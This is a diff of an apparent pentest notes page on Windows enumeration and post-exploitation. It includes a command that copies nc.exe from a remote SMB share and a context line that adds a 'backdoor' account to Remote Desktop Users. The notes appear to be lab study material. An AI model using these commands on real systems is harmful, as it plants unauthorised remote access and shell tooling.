@@ -1,8 +1,12 @@
-# Windows Enumeration
+# Windows
 
-## Enumeration Scripts
+### Windows Version Information
 
-Becoming a super hero is a fairly straight forward process:
+[https://en.wikipedia.org/wiki/Comparison\_of\_Microsoft\_Windows\_versions](https://en.wikipedia.org/wiki/Comparison_of_Microsoft_Windows_versions)
+
+## Windows Enumeration
+
+
 
 ## Windows Post Exploitation
 
@@ -20,7 +24,11 @@ net localgroup "Remote Desktop Users" backdoor /add
 
 #### Connect to share from windows
 
+```bash
 copy \\10.11.0.53\SMBSHARE\nc.exe
+```
+
+
 
 
 
